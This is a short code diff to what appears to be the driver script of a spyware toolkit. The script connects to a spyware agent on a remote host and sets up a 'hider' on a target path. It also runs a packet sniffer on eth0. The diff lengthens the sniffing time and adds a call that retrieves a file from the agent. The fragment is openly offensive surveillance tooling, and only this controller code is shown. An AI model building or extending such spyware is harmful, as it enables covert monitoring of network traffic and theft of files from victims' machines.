@@ -31,12 +31,13 @@ def main():
             "sentSpyware.spy",
         )
     )
-    sleep(2)
+    sleep(3)
     spyAgent = Agent(HOST, PORT_SPYWARE)
     print(spyAgent.hider_setup(targetHiderPath))
 
-    params = ContParams(SnifferType, Params(SniffParams(5, b"eth0")))
+    params = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
     print(spyAgent.runContraption(params, 10))
+    print(spyAgent.retrieve_file("fishTest.txt"))
 
 
 if __name__ == "__main__":
